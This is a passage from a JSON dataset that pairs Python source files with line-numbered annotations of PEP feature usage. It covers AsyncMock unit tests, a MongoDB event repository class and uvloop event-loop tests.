 mock.async_method.assert_awaited()\n        mock.async_method.assert_awaited_once()\n    def test_assert_called_once_and_awaited_twice(self):\n        mock = AsyncMock(AsyncClass)\n        coroutine = mock.async_method()\n        mock.async_method.assert_called_once()\n        asyncio.run(self._await_coroutine(coroutine))\n        with self.assertRaises(RuntimeError):\n            asyncio.run(self._await_coroutine(coroutine))\n        mock.async_method.assert_awaited()\n    def test_assert_awaited_but_not_called(self):\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited()\n        with self.assertRaises(AssertionError):\n            self.mock.assert_called()\n        with self.assertRaises(TypeError):\n            asyncio.run(self._await_coroutine(self.mock))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited()\n        with self.assertRaises(AssertionError):\n            self.mock.assert_called()\n    def test_assert_has_calls_not_awaits(self):\n        kalls = [call('foo')]\n        with self.assertWarns(RuntimeWarning):\n            self.mock('foo')\n        self.mock.assert_has_calls(kalls)\n        with self.assertRaises(AssertionError):\n            self.mock.assert_has_awaits(kalls)\n    def test_assert_has_mock_calls_on_async_mock_no_spec(self):\n        with self.assertWarns(RuntimeWarning):\n            self.mock()\n        kalls_empty = [('', (), {})]\n        self.assertEqual(self.mock.mock_calls, kalls_empty)\n        with self.assertWarns(RuntimeWarning):\n            self.mock('foo')\n            self.mock('baz')\n        mock_kalls = ([call(), call('foo'), call('baz')])\n        self.assertEqual(self.mock.mock_calls, mock_kalls)\n    def test_assert_has_mock_calls_on_async_mock_with_spec(self):\n        a_class_mock = AsyncMock(AsyncClass)\n        with self.assertWarns(RuntimeWarning):\n            a_class_mock.async_method()\n        kalls_empty = [('', (), {})]\n        self.assertEqual(a_class_mock.async_method.mock_calls, kalls_empty)\n        self.assertEqual(a_class_mock.mock_calls, [call.async_method()])\n        with self.assertWarns(RuntimeWarning):\n            a_class_mock.async_method(1, 2, 3, a=4, b=5)\n        method_kalls = [call(), call(1, 2, 3, a=4, b=5)]\n        mock_kalls = [call.async_method(), call.async_method(1, 2, 3, a=4, b=5)]\n        self.assertEqual(a_class_mock.async_method.mock_calls, method_kalls)\n        self.assertEqual(a_class_mock.mock_calls, mock_kalls)\n    def test_async_method_calls_recorded(self):\n        with self.assertWarns(RuntimeWarning):\n            self.mock.something(3, fish=None)\n            self.mock.something_else.something(6, cake=sentinel.Cake)\n        self.assertEqual(self.mock.method_calls, [\n            (\"something\", (3,), {'fish': None}),\n            (\"something_else.something\", (6,), {'cake': sentinel.Cake})\n        ],\n            \"method calls not recorded correctly\")\n        self.assertEqual(self.mock.something_else.method_calls,\n                         [(\"something\", (6,), {'cake': sentinel.Cake})],\n                         \"method calls not recorded correctly\")\n    def test_async_arg_lists(self):\n        def assert_attrs(mock):\n            names = ('call_args_list', 'method_calls', 'mock_calls')\n            for name in names:\n                attr = getattr(mock, name)\n                self.assertIsInstance(attr, _CallList)\n                self.assertIsInstance(attr, list)\n                self.assertEqual(attr, [])\n        assert_attrs(self.mock)\n        with self.assertWarns(RuntimeWarning):\n            self.mock()\n            self.mock(1, 2)\n            self.mock(a=3)\n        self.mock.reset_mock()\n        assert_attrs(self.mock)\n        a_mock = AsyncMock(AsyncClass)\n        with self.assertWarns(RuntimeWarning):\n            a_mock.async_method()\n            a_mock.async_method(1, a=3)\n        a_mock.reset_mock()\n        assert_attrs(a_mock)\n    def test_assert_awaited(self):\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited()\n        asyncio.run(self._runnable_test())\n        self.mock.assert_awaited()\n    def test_assert_awaited_once(self):\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited_once()\n        asyncio.run(self._runnable_test())\n        self.mock.assert_awaited_once()\n        asyncio.run(self._runnable_test())\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited_once()\n    def test_assert_awaited_with(self):\n        msg = 'Not awaited'\n        with self.assertRaisesRegex(AssertionError, msg):\n            self.mock.assert_awaited_with('foo')\n        asyncio.run(self._runnable_test())\n        msg = 'expected await not found'\n        with self.assertRaisesRegex(AssertionError, msg):\n            self.mock.assert_awaited_with('foo')\n        asyncio.run(self._runnable_test('foo'))\n        self.mock.assert_awaited_with('foo')\n        asyncio.run(self._runnable_test('SomethingElse'))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited_with('foo')\n    def test_assert_awaited_once_with(self):\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited_once_with('foo')\n        asyncio.run(self._runnable_test('foo'))\n        self.mock.assert_awaited_once_with('foo')\n        asyncio.run(self._runnable_test('foo'))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_awaited_once_with('foo')\n    def test_assert_any_wait(self):\n        with self.assertRaises(AssertionError):\n            self.mock.assert_any_await('foo')\n        asyncio.run(self._runnable_test('baz'))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_any_await('foo')\n        asyncio.run(self._runnable_test('foo'))\n        self.mock.assert_any_await('foo')\n        asyncio.run(self._runnable_test('SomethingElse'))\n        self.mock.assert_any_await('foo')\n    def test_assert_has_awaits_no_order(self):\n        calls = [call('foo'), call('baz')]\n        with self.assertRaises(AssertionError) as cm:\n            self.mock.assert_has_awaits(calls)\n        self.assertEqual(len(cm.exception.args), 1)\n        asyncio.run(self._runnable_test('foo'))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_has_awaits(calls)\n        asyncio.run(self._runnable_test('foo'))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_has_awaits(calls)\n        asyncio.run(self._runnable_test('baz'))\n        self.mock.assert_has_awaits(calls)\n        asyncio.run(self._runnable_test('SomethingElse'))\n        self.mock.assert_has_awaits(calls)\n    def test_assert_has_awaits_ordered(self):\n        calls = [call('foo'), call('baz')]\n        with self.assertRaises(AssertionError):\n            self.mock.assert_has_awaits(calls, any_order=True)\n        asyncio.run(self._runnable_test('baz'))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_has_awaits(calls, any_order=True)\n        asyncio.run(self._runnable_test('bamf'))\n        with self.assertRaises(AssertionError):\n            self.mock.assert_has_awaits(calls, any_order=True)\n        asyncio.run(self._runnable_test('foo'))\n        self.mock.assert_has_awaits(calls, any_order=True)\n        asyncio.run(self._runnable_test('qux'))\n        self.mock.assert_has_awaits(calls, any_order=True)\n    def test_assert_not_awaited(self):\n        self.mock.assert_not_awaited()\n        asyncio.run(self._runnable_test())\n        with self.assertRaises(AssertionError):\n            self.mock.assert_not_awaited()\n    def test_assert_has_awaits_not_matching_spec_error(self):\n        async def f(x=None): pass\n        self.mock = AsyncMock(spec=f)\n        asyncio.run(self._runnable_test(1))\n        with self.assertRaisesRegex(\n                AssertionError,\n                '^{}$'.format(\n                    re.escape('Awaits not found.\\n'\n                              'Expected: [call()]\\n'\n                              'Actual: [call(1)]'))) as cm:\n            self.mock.assert_has_awaits([call()])\n        self.assertIsNone(cm.exception.__cause__)\n        with self.assertRaisesRegex(\n                AssertionError,\n                '^{}$'.format(\n                    re.escape(\n                        'Error processing expected awaits.\\n'\n                        \"Errors: [None, TypeError('too many positional \"\n                        \"arguments')]\\n\"\n                        'Expected: [call(), call(1, 2)]\\n'\n                        'Actual: [call(1)]'))) as cm:\n            self.mock.assert_has_awaits([call(), call(1, 2)])\n        self.assertIsInstance(cm.exception.__cause__, TypeError)",
            "patterns": {
                "pep_468": [
                    [
                        567,
                        "self.mock(*args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_530": [
                    [
                        524,
                        "return [i async for i in mock_iter]"
                    ]
                ],
                "pep_525": [
                    [
                        541,
                        542,
                        "async for",
                        "async for item in iterator:\n                accumulator.append(item)"
                    ]
                ],
                "pep_498v": [
                    [
                        780,
                        783,
                        ".format()"
                    ],
                    [
                        788,
                        794,
                        ".format()"
                    ]
                ],
                "pep_498": [
                    [
                        34,
                        "async_foo_name = f'{__name__}.AsyncClass'"
                    ],
                    [
                        35,
                        "normal_foo_name = f'{__name__}.NormalClass'"
                    ],
                    [
                        48,
                        "        @patch(f'{async_foo_name}.async_method')"
                    ],
                    [
                        71,
                        "        @patch(f\"{__name__}.async_func\", return_value=1)"
                    ],
                    [
                        72,
                        "        @patch(f\"{__name__}.async_func_args\", return_value=2)"
                    ],
                    [
                        102,
                        "            with patch(f\"{__name__}.async_func\", AsyncMock()):"
                    ],
                    [
                        172,
                        "            with patch(f\"{__name__}.async_func_args\", autospec=True) as mock_method:"
                    ],
                    [
                        202,
                        "            with self.subTest(f\"test method types with {mock_type}\"):"
                    ],
                    [
                        217,
                        "            with self.subTest(f\"test spec kwarg with {mock_type}\"):"
                    ],
                    [
                        228,
                        "            with self.subTest(f\"test spec positional with {mock_type}\"):"
                    ],
                    [
                        450,
                        "            with self.subTest(f\"test set return value of aenter with {mock_type}\"):"
                    ],
                    [
                        470,
                        "            with self.subTest(f\"test context manager magics with {mock_type}\"):"
                    ],
                    [
                        536,
                        "            with self.subTest(f\"test aiter and anext corourtine with {mock_type}\"):"
                    ],
                    [
                        557,
                        "            with self.subTest(f\"default value with {mock_type}\"):"
                    ],
                    [
                        559,
                        "            with self.subTest(f\"set return_value with {mock_type}\"):"
                    ],
                    [
                        561,
                        "            with self.subTest(f\"set return_value iterator with {mock_type}\"):"
                    ]
                ]
            }
        },
        "76": {
            "file": "import asyncio\nimport pymongo\nimport queue as q\nimport random\nfrom pymongo.errors import DuplicateKeyError\nfrom aiohttp.web import HTTPNotFound\nfrom ..utils import async_generator\nfrom ...models.eventnode import EventNode\nfrom ...models.event import Event as ModelEvent\nfrom .deserialize import deserialize_db_event\nfrom .serialize import serialize_to_db_event\nMAX_RECURSIVE_DEPTH = 100\nMAX_WAIT_TIME_SECONDS = 0.5\nclass Event:\n    _collection = \"event\"\n    indexes = [\n        {\"unique\": False, \"keys\": [(\"tags\", pymongo.ASCENDING)]},\n        {\"unique\": False, \"keys\": [(\"time\", pymongo.ASCENDING)]},\n        {\"unique\": False, \"keys\": [(\"update_time\", pymongo.ASCENDING)]},\n    ]\n    def __init__(self, collection):\n        self.collection = collection\n    async def save(self, data: ModelEvent):\n        new_db_format = serialize_to_db_event(data)\n        result = await self.collection.insert_one(new_db_format)\n        return result\n    async def find_one(self) -> ModelEvent:\n        result = await self.collection.find_one()\n        return deserialize_db_event(result)\n    async def find_by_id(self, id) -> ModelEvent:\n        document = None\n        cursor = self.collection.find({\"_id\": id})\n        while await cursor.fetch_next:\n            document = cursor.next_object()\n        if document is None:\n            raise HTTPNotFound(text=\"cannot find event {0}\".format(id))\n        return deserialize_db_event(document)\n    async def update_by_id(self, id, update_doc: ModelEvent, insert: bool = False):\n        new_data = serialize_to_db_event(update_doc)\n        retries = 1\n        while retries >= 0:\n            try:\n                result = await self.collection.find_one_and_replace(\n                    {\"_id\": id}, new_data, upsert=insert\n                )\n                return result\n            except DuplicateKeyError:\n                await asyncio.sleep(random.uniform(0.0, MAX_WAIT_TIME_SECONDS))\n                retries -= 1\n                if retries < 0:\n                    raise\n    async def find_by_parent_id(self, id):\n        cursor = self.collection.find({\"tags\": {\"$in\": [\"parent_id:{0}\".format(id)]}})\n        return async_generator(cursor, deserialize_db_event)\n    async def find(\n        self, tags=None, frm=None, to=None, use_update_time=False, count=100, page=1\n    ):\n        if count < 0:\n            raise ValueError(\"Count must be greater than or equal to zero.\")\n        if page < 1:\n            raise ValueError(\"Page count must be greater than or equal to one.\")\n        time_field = \"update_time\" if use_update_time else \"time\"\n        query = {}\n        if tags is not None:\n            query[\"tags\"] = {\"$all\": tags}\n        if frm and to and not use_update_time:\n            query[time_field] = {\"$elemMatch\": {\"$gte\": frm, \"$lt\": to,}}\n        else:\n            if frm is not None:\n                query[time_field] = {\"$gte\": frm}\n            if to is not None:\n                if query.get(time_field) is None:\n                    query[time_field] = {\"$lt\": to}\n                else:\n                    query[time_field][\"$lt\"] = to\n        cursor = (\n            self.collection.find(query)\n            .sort([(time_field, -1)])\n            .skip((page - 1) * count)\n            .limit(count)\n        )\n        return async_generator(cursor, deserialize_db_event)\n    async def get_tree(self, id):\n        root_event = await self.find_by_id(id)\n        root_event_node = EventNode(event=root_event)\n        queue = q.Queue()\n        queue.put(root_event_node)\n        while not queue.empty():\n            event_node = queue.get()\n            children = await self.find_by_parent_id(event_node.event.id)\n            async for child in children:\n                child_node = EventNode(event=child)\n                if child_node not in event_node.children:\n                    event_node.children.append(child_node)\n                queue.put(child_node)\n        return root_event_node\n    async def trace(self, event_id):\n        result = []\n        currId = event_id\n        curr_depth = 0\n        while currId and curr_depth < MAX_RECURSIVE_DEPTH:\n            try:\n                doc = await self.find_by_id(currId)\n                result.append(doc)\n                currId = doc.parent_id\n                curr_depth += 1\n            except HTTPNotFound:\n                currId = None\n        return result\n    async def delete_by_id(self, id) -> bool:\n        result_map = {0: False, 1: True, None: False}\n        result = await self.collection.delete_one({\"_id\": id})\n        return result_map[result.deleted_count]",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        91,
                        95,
                        "async for",
                        "async for child in children:\n                child_node = EventNode(event=child)\n                if child_node not in event_node.children:\n                    event_node.children.append(child_node)\n                queue.put(child_node)"
                    ]
                ],
                "pep_498v": [
                    [
                        36,
                        36,
                        ".format()"
                    ],
                    [
                        53,
                        53,
                        ".format()"
                    ]
                ]
            }
        },
        "77": {
            "file": "import asyncio\nimport fcntl\nimport logging\nimport os\nimport sys\nimport threading\nimport time\nimport uvloop\nimport unittest\nimport weakref\nfrom unittest import mock\nfrom uvloop._testbase import UVTestCase, AIOTestCase\nclass _TestBase:\n    def test_close(self):\n        self.assertFalse(self.loop._closed)\n        self.assertFalse(self.loop.is_closed())\n        self.loop.close()\n        self.assertTrue(self.loop._closed)\n        self.assertTrue(self.loop.is_closed())\n        self.loop.close()\n        self.loop.close()\n        f = asyncio.Future(loop=self.loop)\n        self.assertRaises(RuntimeError, self.loop.run_forever)\n        self.assertRaises(RuntimeError, self.loop.run_until_complete, f)\n    def test_handle_weakref(self):\n        wd = weakref.WeakValueDictionary()\n        h = self.loop.call_soon(lambda: None)\n        wd['h'] = h  \n    def test_call_soon(self):\n        calls = []\n        def cb(inc):\n            calls.append(inc)\n            self.loop.stop()\n        self.loop.call_soon(cb, 10)\n        h = self.loop.call_soon(cb, 100)\n        self.assertIn('.cb', repr(h))\n        h.cancel()\n        self.assertIn('cancelled', repr(h))\n        self.loop.call_soon(cb, 1)\n        self.loop.run_forever()\n        self.assertEqual(calls, [10, 1])\n    def test_call_soon_base_exc(self):\n        def cb():\n            raise KeyboardInterrupt()\n        self.loop.call_soon(cb)\n        with self.assertRaises(KeyboardInterrupt):\n            self.loop.run_forever()\n        self.assertFalse(self.loop.is_closed())\n    def test_calls_debug_reporting(self):\n        def run_test(debug, meth, stack_adj):\n            context = None\n            def handler(loop, ctx):\n                nonlocal context\n                context = ctx\n            self.loop.set_debug(debug)\n            self.loop.set_exception_handler(handler)\n            def cb():\n                1 / 0\n            meth(cb)\n            self.assertIsNone(context)\n            self.loop.run_until_complete(asyncio.sleep(0.05, loop=self.loop))\n            self.assertIs(type(context['exception']), ZeroDivisionError)\n            self.assertTrue(context['message'].startswith(\n                'Exception in callback'))\n            if debug:\n                tb = context['source_traceback']\n                self.assertEqual(tb[-1 + stack_adj].name, 'run_test')\n            else:\n                self.assertFalse('source_traceback' in context)\n            del context\n        for debug in (True, False):\n            for meth_name, meth, stack_adj in (\n                ('call_soon',\n                    self.loop.call_soon, 0),\n                ('call_later',  \n                    lambda *args: self.loop.call_later(0.01, *args), -1)\n            ):\n                with self.subTest(debug=debug, meth_name=meth_name):\n                    run_test(debug, meth, stack_adj)\n    def test_now_update(self):\n        async def run():\n            st = self.loop.time()\n            time.sleep(0.05)\n            return self.loop.time() - st\n        delta = self.loop.run_until_complete(run())\n        self.assertTrue(delta > 0.049 and delta < 0.6)\n    def test_call_later_1(self):\n        calls = []\n        def cb(inc=10, stop=False):\n            calls.append(inc)\n            self.assertTrue(self.loop.is_running())\n            if stop:\n                self.loop.call_soon(self.loop.stop)\n        self.loop.call_later(0.05, cb)\n        h = self.loop.call_later(0.05, cb, 100, True)\n        self.assertIn('.cb', repr(h))\n        h.cancel()\n        self.assertIn('cancelled', repr(h))\n        self.loop.call_later(0.05, cb, 1, True)\n        self.loop.call_later(1000, cb, 1000)  \n        started = time.monotonic()\n        self.loop.run_forever()\n        finished = time.monotonic()\n        self.assertEqual(calls, [10, 1])\n        self.assertFalse(self.loop.is_running())\n        self.assertLess(finished - started, 0.1)\n        self.assertGreater(finished - started, 0.04)\n    def test_call_later_2(self):\n        async def main():\n            await asyncio.sleep(0.001, loop=self.loop)\n            time.sleep(0.01)\n            await asyncio.sleep(0.01, loop=self.loop)\n        started = time.monotonic()\n        self.loop.run_until_complete(main())\n        delta = time.monotonic() - started\n        self.assertGreater(delta, 0.019)\n    def test_call_later_negative(self):\n        calls = []\n        def cb(arg):\n            calls.append(arg)\n            self.loop.stop()\n        self.loop.call_later(-1, cb, 'a')\n        self.loop.run_forever()\n        self.assertEqual(calls, ['a'])\n    def test_call_at(self):\n        if os.environ.get('TRAVIS_OS_NAME'):\n            raise unittest.SkipTest('time is not monotonic on Travis')\n        i = 0\n        def cb(inc):\n            nonlocal i\n            i += inc\n            self.loop.stop()\n        at = self.loop.time() + 0.05\n        self.loop.call_at(at, cb, 100).cancel()\n        self.loop.call_at(at, cb, 10)\n        started = time.monotonic()\n        self.loop.run_forever()\n        finished = time.monotonic()\n        self.assertEqual(i, 10)\n        self.assertLess(finished - started, 0.07)\n        self.assertGreater(finished - started, 0.045)\n    def test_check_thread(self):\n        def check_thread(loop, debug):\n            def cb():\n                pass\n            loop.set_debug(debug)\n            if debug:\n                msg = (\"Non-thread-safe operation invoked on an \"\n                       \"event loop other than the current one\")\n                with self.assertRaisesRegex(RuntimeError, msg):\n                    loop.call_soon(cb)\n                with self.assertRaisesRegex(RuntimeError, msg):\n                    loop.call_later(60, cb)\n                with self.assertRaisesRegex(RuntimeError, msg):\n                    loop.call_at(loop.time() + 60, cb)\n            else:\n                loop.call_soon(cb)\n                loop.call_later(60, cb)\n                loop.call_at(loop.time() + 60, cb)\n        def check_in_thread(loop, event, debug, create_loop, fut):\n            event.wait()\n            try:\n                if create_loop:\n                    loop2 = self.new_loop()\n                    try:\n                        asyncio.set_event_loop(loop2)\n                        check_thread(loop, debug)\n                    finally:\n                        asyncio.set_event_loop(None)\n                        loop2.close()\n                else:\n                    check_thread(loop, debug)\n            except Exception as exc:\n                loop.call_soon_threadsafe(fut.set_exception, exc)\n            else:\n                loop.call_soon_threadsafe(fut.set_result, None)\n        def test_thread(loop, debug, create_loop=False):\n            event = threading.Event()\n            fut = asyncio.Future(loop=loop)\n            loop.call_soon(event.set)\n            args = (loop, event, debug, create_loop, fut)\n            thread = threading.Thread(target=check_in_thread, args=args)\n            thread.start()\n            loop.run_until_complete(fut)\n            thread.join()\n        test_thread(self.loop, True)\n        test_thread(self.loop, False)\n        test_thread(self.loop, True, create_loop=True)\n        test_thread(self.loop, False, create_loop=True)\n    def test_run_once_in_executor_plain(self):\n        called = []\n        def cb(arg):\n            called.append(arg)\n        async def runner():\n            await self.loop.run_in_executor(None, cb, 'a')\n        self.loop.run_until_complete(runner())\n        self.assertEqual(called, ['a'])\n    def test_set_debug(self):\n        self.loop.set_debug(True)\n        self.assertTrue(self.loop.get_debug())\n        self.loop.set_debug(False)\n        self.assertFalse(self.loop.get_debug())\n    def test_run_until_complete_type_error(self):\n        self.assertRaises(\n            TypeError, self.loop.run_until_complete, 'blah')\n    def test_run_until_complete_loop(self):\n        task = asyncio.Future(loop=self.loop)\n        other_loop = self.new_loop()\n        self.addCleanup(other_loop.close)\n        self.assertRaises(\n            ValueError, other_loop.run_until_complete, task)\n    def test_run_until_complete_error(self):\n        async def foo():\n            raise ValueError('aaa')\n        with self.assertRaisesRegex(ValueError, 'aaa'):\n            self.loop.run_until_complete(foo())\n    def test_run_until_complete_loop_orphan_future_close_loop(self):\n        if self.implementation == 'asyncio' and sys.version_info < (3, 6, 2):\n            raise unittest.SkipTest('unfixed asyncio')\n        class ShowStopper(BaseException):\n            pass\n        async def foo(delay):\n            await asyncio.sleep(delay, loop=self.loop)\n        def throw():\n            raise ShowStopper\n        self.loop.call_soon(throw)\n        try:\n            self.loop.run_until_complete(foo(0.1))\n        except ShowStopper:\n            pass\n        self.loop.run_until_complete(foo(0.2))\n    def test_debug_slow_callbacks(self):\n        logger = logging.getLogger('asyncio')\n        self.loop.set_debug(True)\n        self.loop.slow_callback_duration = 0.2\n        self.loop.call_soon(lambda: time.sleep(0.3))\n        with mock.patch.object(logger, 'warning') as log:\n            self.loop.run_until_complete(asyncio.sleep(0, loop=self.loop))\n        self.assertEqual(log.call_count, 1)\n        msg = log.call_args[0][0] % log.call_args[0][1:]\n        self.assertIn('Executing <Handle', msg)\n        self.assertIn('test_debug_slow_callbacks', msg)\n    def test_debug_slow_timer_callbacks(self):\n        logger = logging.getLogger('asyncio')\n        self.loop.set_debug(True)\n        self.loop.slow_callback_duration = 0.2\n        self.loop.call_later(0.01, lambda: time.sleep(0.3))\n        with mock.patch.object(logger, 'warning') as log:\n            self.loop.run_until_complete(asyncio.sleep(0.02, loop=self.loop))\n        self.assertEqual(log.call_count, 1)\n        msg = log.call_args[0][0] % log.call_args[0][1:]\n    def test_default_exc_handler_callback(self):\n        self.loop._process_events = mock.Mock()\n        def zero_error(fut):\n            fut.set_result(True)\n            1 / 0\n        logger = logging.getLogger('asyncio')\n        with mock.patch.object(logger, 'error') as log:\n            fut = asyncio.Future(loop=self.loop)\n            self.loop.call_soon(zero_error, fut)\n            fut.add_done_callback(lambda fut: self.loop.stop())\n            self.loop.run_forever()\n            log.assert_called_with(\n                self.mock_pattern('Exception in callback.*zero'),\n                exc_info=mock.ANY)\n        with mock.patch.object(logger, 'error') as log:\n            fut = asyncio.Future(loop=self.loop)\n            self.loop.call_later(0.01, zero_error, fut)\n            fut.add_done_callback(lambda fut: self.loop.stop())\n            self.loop.run_forever()\n            log.assert_called_with(\n                self.mock_pattern('Exception in callback.*zero'),\n                exc_info=mock.ANY)\n    def test_set_exc_handler_custom(self):\n        logger = logging.getLogger('asyncio')\n        def run_loop():\n            def zero_error():\n                self.loop.stop()\n                1 / 0\n            self.loop.call_soon(zero_error)\n            self.loop.run_forever()\n        errors = []\n        def handler(loop, exc):\n            errors.append(exc)\n        self.loop.set_debug(True)\n        if hasattr(self.loop, 'get_exception_handler'):\n            self.assertIsNone(self.loop.get_exception_handler())\n        self.loop.set_exception_handler(handler)\n        if hasattr(self.loop, 'get_exception_handler'):\n            self.assertIs(self.loop.get_exception_handler(), handler)\n        run_loop()\n        self.assertEqual(len(errors), 1)\n        self.assertRegex(errors[-1]['message'],\n                         'Exception in callback.*zero_error')\n        self.loop.set_exception_handler(None)\n        with mock.patch.object(logger, 'error') as log:\n            run_loop()\n            log.assert_called_with(\n                self.mock_pattern('Exception in callback.*zero'),\n                exc_info=mock.ANY)\n        self.assertEqual(len(errors), 1)\n    def test_set_exc_handler_broken(self):\n        logger = logging.getLogger('asyncio')\n        def run_loop():\n            def zero_error():\n                self.loop.stop()\n                1 / 0\n            self.loop.call_soon(zero_error)\n            self.loop.run_forever()\n        def handler(loop, context):\n            raise AttributeError('spam')\n        self.loop._process_events = mock.Mock()\n        self.loop.set_exception_handler(handler)\n        with mock.patch.object(logger, 'error') as log:\n            run_loop()\n            log.assert_called_with(\n                self.mock_pattern('Unhandled error in exception handler'),\n                exc_info=mock.ANY)\n    def test_default_exc_handler_broken(self):\n        logger = logging.getLogger('asyncio')\n        _context = None\n        class Loop(uvloop.Loop):\n            _selector = mock.Mock()\n            _process_events = mock.Mock()\n            def default_exception_handler(self, context):\n                nonlocal _context\n                _context = context\n                raise ValueError('spam')\n        loop = Loop()\n        self.addCleanup(loop.close)\n        asyncio.set_event_loop(loop)\n        def run_loop():\n            def zero_error():\n                loop.stop()\n                1 / 0\n            loop.call_soon(zero_error)\n            loop.run_forever()\n        with mock.patch.object(logger, 'error') as log:\n            run_loop()\n            log.assert_called_with(\n                'Exception in default exception handler',\n                exc_info=True)\n        def custom_handler(loop, context):\n            raise ValueError('ham')\n        _context = None\n        loop.set_exception_handler(custom_handler)\n        with mock.patch.object(logger, 'error') as log:\n            run_loop()\n            log.assert_called_with(\n                self.mock_pattern('Exception in default exception.*'\n                                  'while handling.*in custom'),\n                exc_info=True)\n            self.assertIn('context', _context)\n            self.assertIs(type(_context['context']['exception']),\n                          ZeroDivisionError)\n    def test_set_task_factory_invalid(self):\n        with self.assertRaisesRegex(\n                TypeError,\n                'task factory must be a callable or None'):\n            self.loop.set_task_factory(1)\n        self.assertIsNone(self.loop.get_task_factory())\n    def test_set_task_factory(self):\n        self.loop._process_events = mock.Mock()\n        class MyTask(asyncio.Task):\n            pass\n        @asyncio.coroutine\n        def coro():\n            pass\n        factory = lambda loop, coro: MyTask(coro, loop=loop)\n        self.assertIsNone(self.loop.get_task_factory())\n        self.loop.set_task_factory(factory)\n        self.assertIs(self.loop.get_task_factory(), factory)\n        task = self.loop.create_task(coro())\n        self.assertTrue(isinstance(task, MyTask))\n        self.loop.run_until_complete(task)\n        self.loop.set_task_factory(None)\n        self.assertIsNone(self.loop.get_task_factory())\n        task = self.loop.create_task(coro())\n        self.assertTrue(isinstance(task, asyncio.Task))\n        self.assertFalse(isinstance(task, MyTask))\n        self.loop.run_until_complete(task)\n    def _compile_agen(self, src):\n        try:\n            g = {}\n            exec(src, globals(), g)\n        except SyntaxError:\n            raise unittest.SkipTest()\n        else:\n            return g['waiter']\n    def test_shutdown_asyncgens_01(self):\n        finalized = list()\n        if not hasattr(self.loop, 'shutdown_asyncgens'):\n            raise unittest.SkipTest()\n        waiter = self._compile_agen(\n            )\n        async def wait():\n            async for _ in waiter(1, finalized, self.loop):\n                pass\n        t1 = self.loop.create_task(wait())\n        t2 = self.loop.create_task(wait())\n        self.loop.run_until_complete(asyncio.sleep(0.1, loop=self.loop))\n        self.loop.run_until_complete(self.loop.shutdown_asyncgens())\n        self.assertEqual(finalized, [1, 1])\n        t1.cancel()\n        t2.cancel()\n        self.loop.run_until_complete(asyncio.sleep(0.1, loop=self.loop))\n    def test_shutdown_asyncgens_02(self):\n        if not hasattr(self.loop, 'shutdown_asyncgens'):\n            raise unittest.SkipTest()\n        logged = 0\n        def logger(loop, context):\n            nonlocal logged\n            self.assertIn('asyncgen', context)\n            expected = 'an error occurred during closing of asynchronous'\n            if expected in context['message']:\n                logged += 1\n        waiter = self._compile_agen()\n        async def wait():\n            async for _ in waiter(1, self.loop):\n                pass\n        t = self.loop.create_task(wait())\n        self.loop.run_until_complete(asyncio.sleep(0.1, loop=self.loop))\n        self.loop.set_exception_handler(logger)\n        self.loop.run_until_complete(self.loop.shutdown_asyncgens())\n        self.assertEqual(logged, 1)\n        t.cancel()\n        self.loop.run_until_complete(asyncio.sleep(0.1, loop=self.loop))\n    def test_shutdown_asyncgens_03(self):\n        if not hasattr(self.loop, 'shutdown_asyncgens'):\n            raise unittest.SkipTest()\n        waiter = self._compile_agen()\n        async def foo():\n            await waiter().asend(None)\n        self.loop.run_until_complete(foo())\n        self.loop.run_until_complete(asyncio.sleep(0.01, loop=self.loop))\n    def test_inf_wait_for(self):\n        async def foo():\n            await asyncio.sleep(0.1, loop=self.loop)\n            return 123\n        res = self.loop.run_until_complete(\n            asyncio.wait_for(foo(), timeout=float('inf'), loop=self.loop))\n        self.assertEqual(res, 123)\nclass TestBaseUV(_TestBase, UVTestCase):\n    def test_loop_create_future(self):\n        fut = self.loop.create_future()\n        self.assertTrue(isinstance(fut, asyncio.Future))\n        self.assertIs(fut._loop, self.loop)\n        fut.cancel()\n    def test_loop_call_soon_handle_cancelled(self):\n        cb = lambda: False\n        handle = self.loop.call_soon(cb)\n        self.assertFalse(handle.cancelled())\n        handle.cancel()\n        self.assertTrue(handle.cancelled())\n        handle = self.loop.call_soon(cb)\n        self.assertFalse(handle.cancelled())\n        self.run_loop_briefly()\n        self.assertFalse(handle.cancelled())\n    def test_loop_call_later_handle_cancelled(self):\n        cb = lambda: False\n        handle = self.loop.call_later(0.01, cb)\n        self.assertFalse(handle.cancelled())\n        handle.cancel()\n        self.assertTrue(handle.cancelled())\n        handle = self.loop.call_later(0.01, cb)\n        self.assertFalse(handle.cancelled())\n        self.run_loop_briefly(delay=0.05)\n        self.assertFalse(handle.cancelled())\n    def test_loop_std_files_cloexec(self):\n        for fd in {0, 1, 2}:\n            flags = fcntl.fcntl(fd, fcntl.F_GETFD)\n            self.assertFalse(flags & fcntl.FD_CLOEXEC)\nclass TestBaseAIO(_TestBase, AIOTestCase):\n    pass\nclass TestPolicy(unittest.TestCase):\n    def test_uvloop_policy(self):\n        try:\n            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\n            loop = asyncio.new_event_loop()\n            try:\n                self.assertIsInstance(loop, uvloop.Loop)\n            finally:\n                loop.close()\n        finally:\n            asyncio.set_event_loop_policy(None)\n    @unittest.skipUnless(hasattr(asyncio, '_get_running_loop'),\n                         'No asyncio._get_running_loop')\n    def test_running_loop_within_a_loop(self):\n        @asyncio.coroutine\n        def runner(loop):\n            loop.run_forever()\n        try:\n            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\n            loop = asyncio.new_event_loop()\n            outer_loop = asyncio.new_event_loop()\n            try:\n                with self.assertRaisesRegex(RuntimeError,\n                                            'while another loop is running'):\n                    outer_loop.run_until_complete(runner(loop))\n            finally:\n                loop.close()\n                outer_loop.close()\n        finally:\n            asyncio.set_event_loop_policy(None)\n    @unittest.skipUnless(hasattr(asyncio, 